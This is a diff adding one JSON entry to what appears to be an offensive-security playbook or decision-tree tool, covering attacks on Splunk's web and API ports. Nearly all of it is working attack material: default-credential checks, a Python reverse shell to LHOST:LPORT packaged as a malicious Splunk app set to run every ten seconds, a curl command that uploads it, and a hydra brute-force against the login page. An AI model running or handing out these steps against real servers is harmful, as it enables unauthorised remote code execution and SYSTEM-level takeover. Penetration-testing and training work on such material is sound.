@@ -1,0 +1,22 @@
+{
+  "id": "splunkd",
+  "phase": "WEB",
+  "title": "Splunkd (8089/8000)",
+  "body": "Splunk = instant RCE if you have admin creds. Create a malicious app (Python script in a .tar.gz) and upload via the package manager. Port 8089 is the API, 8000 is the web UI.",
+  "cmd": "nmap -p 8000,8089 -sV $ip\ncurl -k https://$ip:8089/services      # API info\ncurl -k -u admin:changeme https://$ip:8089/services/server/info  # Version\n\n# Default creds: admin:changeme  admin:password  admin:admin\n\n# CVE-2023-46214 — XSLT injection (Splunk < 9.1.2) — check version\n\n# RCE via malicious Splunk app (requires admin)\n# Create the app structure:\nmkdir -p splunk_shell/bin\ncat > splunk_shell/bin/run.py << 'PYEOF'\nimport sys,socket,os,pty\ns=socket.socket()\ns.connect((\"LHOST\",LPORT))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/bash\")\nPYEOF\n\ncat > splunk_shell/default/inputs.conf << 'CONFEOF'\n[script://./bin/run.py]\ndisabled = false\ninterval = 10\nsourcetype = test\nCONFEOF\n\ntar -czf splunk_shell.tar.gz splunk_shell/\n\n# Upload via web UI: Apps > Manage Apps > Install app from file\n# OR via API:\ncurl -k -u admin:changeme https://$ip:8089/services/apps/local   -F \"name=splunk_shell\"   -F \"filename=true\"   -F \"appfile=@splunk_shell.tar.gz\"\n\n# Brute force Splunk login\nhydra -l admin -P rockyou.txt $ip http-post-form   \"/en-US/account/login:username=^USER^&password=^PASS^&return_to=%2Fen-US%2F:Invalid\"",
+  "warn": "On Windows, Splunk runs as SYSTEM by default — instant privilege escalation. On Linux, check the splunk user's sudo rights.",
+  "choices": [
+    {
+      "label": "Got admin — uploaded malicious app = shell",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Brute forced creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "Need to escalate — Splunk runs as SYSTEM",
+      "next": "got_root_windows"
+    }
+  ]
+}
